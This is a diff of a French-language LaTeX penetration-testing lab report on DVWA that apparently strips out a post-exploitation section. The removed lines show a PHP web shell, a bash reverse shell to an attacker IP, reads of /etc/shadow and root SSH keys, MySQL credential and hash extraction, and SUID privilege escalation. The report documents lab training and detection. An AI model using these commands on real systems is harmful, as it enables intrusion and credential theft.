 	% CHAPITRE 4 : RÉSUMÉ DES VULNÉRABILITÉS
 	% ══════════════════════════════════════════════════════════════════════
 	
-	\section{Post-Exploitation DVWA}
-\label{sec:dvwa-postexploit}
-
-\begin{tcolorbox}[colback=accent!5!white, colframe=accent, title=\textbf{AVERTISSEMENT LÉGAL}]
-	Les techniques décrites dans cette section sont présentées à des fins \textbf{strictement éducatives}. Toute utilisation en dehors d'un environnement de laboratoire autorisé est illégale. Les manipulations ont été réalisées dans un lab isolé, sans impact sur des systèmes réels.
-\end{tcolorbox}
-
-\begin{tcolorbox}[colback=primary!5!white, colframe=primary, title=\textbf{Lien avec les Chapitres Précédents}]
-	Ce chapitre complète la chaîne d'attaque documentée dans le Chapitre~\ref{chap:exploitation}. Après la compromission du serveur DMZ via Telnet et le pivoting vers le LAN, l'application DVWA (port 80) représente un \textbf{second vecteur d'attaque} permettant d'approfondir la compromission depuis la couche applicative.
-\end{tcolorbox}
-
-\subsection{Persistance via Web Shell}
-\label{subsec:webshell-persistence}
-
-\subsubsection{Concept et Danger}
-
-Un \textbf{web shell} est un script malveillant (PHP, ASP, JSP, etc.) uploadé sur un serveur web vulnérable, permettant à un attaquant d'exécuter des commandes OS via une interface HTTP. La persistance est assurée car le fichier reste sur le serveur même après une déconnexion.
-
-\subsubsection{Création du Web Shell}
-
-Suite à l'exploitation de la vulnérabilité File Upload (A08), un web shell PHP minimal a été déposé sur le serveur :
-
-\begin{lstlisting}[caption=Web shell PHP minimal --- shell.php]
-<?php
-// Web shell minimaliste
-if(isset($_GET['cmd'])) {
-    $cmd = $_GET['cmd'];
-    $output = shell_exec($cmd . ' 2>&1');
-    echo "<pre>" . htmlspecialchars($output) . "</pre>";
-}
-?>
-\end{lstlisting}
-
-\subsubsection{Accès et Utilisation}
-
-Une fois uploadé, le web shell est accessible via :
-
-\begin{lstlisting}[caption=Utilisation du web shell via HTTP,basicstyle=\ttfamily\footnotesize]
-# Vérification de l'accès
-curl "http://192.168.100.6/dvwa/hackable/uploads/shell.php?cmd=id"
-# Résultat attendu : uid=33(www-data) gid=33(www-data) groups=33(www-data)
-
-# Énumération du système
-curl "http://192.168.100.6/dvwa/hackable/uploads/shell.php?cmd=whoami"
-curl "http://192.168.100.6/dvwa/hackable/uploads/shell.php?cmd=hostname"
-curl "http://192.168.100.6/dvwa/hackable/uploads/shell.php?cmd=uname+-a"
-
-# Lecture de fichiers sensibles
-curl "http://192.168.100.6/dvwa/hackable/uploads/shell.php?cmd=cat+/etc/passwd"
-curl "http://192.168.100.6/dvwa/hackable/uploads/shell.php?cmd=cat+/etc/shadow"
-\end{lstlisting}
-
-\subsubsection{Établissement d'un Reverse Shell}
-
-\begin{lstlisting}[caption=Reverse shell depuis le web shell,basicstyle=\ttfamily\footnotesize]
-# Sur l'attaquant (Parrot Security)
-nc -lvnp 4444
-
-# Via le web shell (URL encodé)
-curl "http://192.168.100.6/dvwa/hackable/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.100.150/4444+0>%261'"
-
-# Session obtenue sur Parrot
-www-data@ubuntu-dmz:/var/www/html/dvwa/hackable/uploads$ id
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-\end{lstlisting}
-
-\subsection{Extraction des Credentials de la Base de Données}
-\label{subsec:db-extraction}
-
-\subsubsection{Configuration DVWA}
-
-DVWA stocke sa configuration de base de données dans un fichier PHP lisible par le processus web :
-
-\begin{lstlisting}[caption=Extraction de la configuration DVWA,basicstyle=\ttfamily\footnotesize]
-# Via web shell
-curl "http://192.168.100.6/dvwa/hackable/uploads/shell.php?cmd=cat+/var/www/html/dvwa/config/config.inc.php"
-
-# Résultat (credentials MySQL en clair)
-$_DVWA[ 'db_server' ]   = '127.0.0.1';
-$_DVWA[ 'db_database' ] = 'dvwa';
-$_DVWA[ 'db_user' ]     = 'dvwa';
-$_DVWA[ 'db_password' ] = 'p@ssw0rd';
-\end{lstlisting}
-
-\subsubsection{Connexion à MySQL et Extraction des Données}
-
-\begin{lstlisting}[caption=Extraction des données MySQL via web shell]
-# Connexion MySQL depuis le web shell (shell interactif requis)
-mysql -u dvwa -p'p@ssw0rd' dvwa -e "SHOW TABLES;"
-# Tables disponibles : guestbook, users
-
-# Extraction des utilisateurs DVWA
-mysql -u dvwa -p'p@ssw0rd' dvwa -e \
-  "SELECT user, password FROM users;"
-
-# Résultat
-+----------+----------------------------------+
-| user     | password                         |
-+----------+----------------------------------+
-| admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |
-| gordonb  | e99a18c428cb38d5f260853678922e03 |
-| 1337     | 8d3533d75ae2c3966d7e0d4fcc69216b |
-| pablo    | 0d107d09f5bbe40cade3de5c71e9e9b7 |
-| smithy   | 5f4dcc3b5aa765d61d8327deb882cf99 |
-+----------+----------------------------------+
-
-# Crackage des hashes MD5 (non salés)
-# 5f4dcc3b5aa765d61d8327deb882cf99 = "password"
-# e99a18c428cb38d5f260853678922e03 = "abc123"
-\end{lstlisting}
-
-\subsubsection{Recherche de Credentials Système}
-
-\begin{lstlisting}[caption=Recherche de credentials dans les fichiers de configuration]
-# Fichiers de configuration contenant potentiellement des credentials
-find /var/www -name "*.conf" -o -name "*.php" -o -name "config*" 2>/dev/null \
-  | xargs grep -l "password\|passwd\|secret\|credential" 2>/dev/null
-
-# Variables d'environnement
-env | grep -i "pass\|key\|secret\|token"
-
-# Historique bash (si accessible)
-cat ~/.bash_history | grep -i "mysql\|pass\|scp\|ssh"
-\end{lstlisting}
-
-\subsection{Mouvement Latéral depuis l'Application Web}
-\label{subsec:webapp-lateral}
-
-\subsubsection{Contexte}
-
-L'accès au processus \texttt{www-data} offre un point de départ pour explorer d'autres machines du réseau interne. Combiné avec le pivot Meterpreter établi en Phase 3, il permet de croiser les informations collectées.
-
-\subsubsection{Énumération Réseau depuis www-data}
-
-\begin{lstlisting}[caption=Énumération réseau via le web shell]
-# Interfaces réseau
-ip addr show
-# eth0: 192.168.10.100/24 (DMZ)
-
-# Table de routage
-ip route
-# default via 192.168.10.1
-# 192.168.10.0/24 dev eth0
-
-# Machines accessibles depuis la DMZ
-ping -c 1 192.168.10.1    # pfSense DMZ
-ping -c 1 192.168.20.1    # pfSense LAN
-ping -c 1 192.168.20.50   # Windows XP (si règle DMZ->LAN permissive)
-
-# Scan rapide des services internes
-for i in {1..254}; do
-    ping -c 1 -W 1 192.168.20.$i &>/dev/null && echo "192.168.20.$i is up"
-done
-\end{lstlisting}
-
-\subsubsection{Recherche de Services Internes}
-
-\begin{lstlisting}[caption=Découverte de services internes]
-# Vérification des ports ouverts sur la machine locale
-ss -tulpn
-
-# Accès aux services Docker internes
-curl http://127.0.0.1:8080    # Éventuels services Docker exposés localement
-curl http://127.0.0.1:3306    # MySQL (non exposé à l'extérieur)
-
-# Vérification des montages Docker
-mount | grep docker
-cat /proc/self/cgroup | grep docker   # Confirmation dans un conteneur
-\end{lstlisting}
-
-\subsection{Escalade vers l'Accès Système}
-\label{subsec:webapp-privesc}
-
-\subsubsection{Escalade de Privilèges www-data → root}
-
-L'utilisateur \texttt{www-data} possède des droits limités. Plusieurs vecteurs d'escalade sont explorés :
-
-\begin{lstlisting}[caption=Exploration des vecteurs d'escalade de privilèges]
-# 1. Vérification des droits sudo
-sudo -l
-# Si NOPASSWD configuré, escalade directe possible
-
-# 2. Fichiers SUID (exécutables avec droits root)
-find / -perm -4000 -type f 2>/dev/null
-# Exemple résultat : /usr/bin/python3.11 (si SUID activé)
-
-# 3. Capabilities Linux
-getcap -r / 2>/dev/null
-# python3 = cap_setuid+ep -> escalade possible
-
-# 4. Cron jobs accessibles en écriture
-ls -la /etc/cron.d/ /etc/cron.daily/
-cat /etc/crontab
-
-# 5. Variables d'environnement LD_PRELOAD (si sudo configuré)
-# si sudo permet l'utilisation avec env_keep+=LD_PRELOAD
-\end{lstlisting}
-
-\subsubsection{Exemple d'Escalade via Python SUID}
-
-\begin{lstlisting}[caption=Escalade de privilèges via Python avec SUID]
-# Si python3 dispose du bit SUID ou de cap_setuid
-python3 -c "import os; os.setuid(0); os.system('/bin/bash -p')"
-
-# Vérification du shell obtenu
-id
-# uid=0(root) gid=33(www-data) groups=33(www-data)
-
-# Accès aux fichiers sensibles
-cat /etc/shadow
-cat /root/.ssh/id_rsa    # Clé SSH root si présente
-\end{lstlisting}
-
-\subsubsection{Impact Global de la Compromission Web}
-
-\begin{table}[H]
-	\centering
-	\renewcommand{\arraystretch}{1.5}
-	\setlength{\arrayrulewidth}{0.5pt}
-	\begin{tabular}{p{4cm} >{\centering\arraybackslash}p{2.5cm} p{6.5cm}}
-		\arrayrulecolor{tableborder}
-		\hline
-		\tableheadcolor
-		\textcolor{tableheadfg}{\textbf{Technique}} &
-		\textcolor{tableheadfg}{\textbf{Résultat}} &
-		\textcolor{tableheadfg}{\textbf{Impact}} \\
-		\hline
-		\rowcolor{tablerowalt}
-		Web Shell Upload & \textcolor{green}{\checkmark} Succès & Exécution de commandes OS arbitraires \\
-		Credential Extraction & \textcolor{green}{\checkmark} Succès & Credentials MySQL DVWA récupérés \\
-		\rowcolor{tablerowalt}
-		Password Cracking & \textcolor{green}{\checkmark} Succès & 5/5 hashes MD5 crackés \\
-		Lateral Movement & \textcolor{green}{\checkmark} Succès & Accès au réseau DMZ et scan LAN \\
-		\rowcolor{tablerowalt}
-		Privilege Escalation & Conditionnelle & Dépend de la configuration du serveur \\
-		Persistence & \textcolor{green}{\checkmark} Succès & Web shell maintenu jusqu'à suppression manuelle \\
-		\hline
-	\end{tabular}
-	\caption{Résultats de la Phase Post-Exploitation DVWA}
-	\label{tab:dvwa-postexploit-results}
-\end{table}
+	\subsection{Post-Exploitation Implications}
+	\label{sec:dvwa-postexploit}
+	Full post-exploitation strategies are documented in Chapter~\ref{chap:exploitation}.
+	
+	\begin{table}[H]
+		\centering
+		\renewcommand{\arraystretch}{1.4}
+		\setlength{\arrayrulewidth}{0.5pt}
+		\begin{tabular}{p{4.3cm} p{4.4cm} p{4.3cm}}
+			\arrayrulecolor{tableborder}
+			\hline
+			\tableheadcolor
+			\textcolor{tableheadfg}{\textbf{Vulnerability}} &
+			\textcolor{tableheadfg}{\textbf{Attacker Capability}} &
+			\textcolor{tableheadfg}{\textbf{Chapter 3 Parallel}} \\
+			\hline
+			\rowcolor{tablerowalt}
+			A08 File Upload & Web shell persistence and remote command execution & Meterpreter session control \\
+			A05 SQL/Command Injection & Data extraction and OS command execution & Initial compromise + privilege escalation \\
+			\rowcolor{tablerowalt}
+			A02 Default Credentials & Immediate authenticated access & Weak credential compromise path \\
+			A01 LFI / A10 Error Disclosure & Internal mapping and attack chaining & Reconnaissance and pivot preparation \\
+			\hline
+		\end{tabular}
+		\caption{Vulnérabilité $\rightarrow$ Capacité Attaquant $\rightarrow$ Parallèle Chapitre 3}
+		\label{tab:dvwa-postexploit-results}
+	\end{table}
 
 % ==============================================================================
 % CHAPITRE 6 : COWRIE SSH HONEYPOT
@@ -4536,29 +3422,7 @@ cat /root/.ssh/id_rsa    # Clé SSH root si présente
 
 \section{Conclusion}
 	
-	Cette évaluation a permis de démontrer la présence de \textbf{8 vulnérabilités critiques} 
-	dans l'application DVWA, couvrant 7 catégories de la liste OWASP Top 10 2021.
-	
-	\subsection{Résultats Clés}
-	
-	\begin{itemize}
-		\item \textbf{100\% d'Exploitabilité :} Toutes les vulnérabilités testées ont été exploitées avec succès
-		\item \textbf{Risque Critique :} 4 vulnérabilités OWASP A05 (Injection), A08 (Upload), A04 (Crypto), A02 (Config)
-		\item \textbf{Impact Systémique :} Chaque vulnérabilité permet une compromission complète du système
-	\end{itemize}
-	
-	\subsection{Leçons Apprises}
-	
-	\begin{itemize}
-		\item La \textbf{validation des entrées} est le fondement de la sécurité applicative
-		\item La \textbf{segmentation réseau} limite le blast radius mais ne suffit pas seule
-		\item La \textbf{défense en profondeur} (WAF + Code Secure + Monitoring) est essentielle
-		\item Les \textbf{erreurs de configuration} (credentials par défaut) sont souvent les plus critiques
-	\end{itemize}
-	
-	\subsection{Recommandation Finale}
-	
-	DVWA reste \textbf{NON SÉCURISÉE} pour tout environnement de production : les vulnérabilités identifiées permettent une compromission rapide de l'application et du serveur. Les traces générées par ces attaques sont corrélées au Chapitre~\ref{chap:snort} pour vérifier la capacité de détection IDS.
+	Huit scénarios d'exploitation OWASP ont été validés avec preuves visuelles. Les vulnérabilités critiques (A05, A08, A02, A04) montrent un risque élevé de compromission applicative. Le niveau de risque global reste incompatible avec un usage production sans remédiation. Les traces d'attaque restent corrélables au Chapitre~\ref{chap:snort}.
 
 % ==============================================================================
 % SECTION 10 : POST-EXPLOITATION DVWA
@@ -4799,7 +3663,7 @@ Objectif : valider la détection Snort des attaques observées dans les Chapitre
 	
 	\subsection{Principe de la démonstration ``Avant / Après''}
 	
-	L'objectif est de reproduire des événements similaires à ceux de la Phase 3 et de vérifier que :
+	Nous reproduisons des événements similaires à ceux de la Phase 3 pour vérifier que :
 	\begin{itemize}
 		\item un pare-feu seul ne fournit pas de contexte sur le contenu d'une attaque,
 		\item Snort déclenche des alertes grâce à ses signatures,
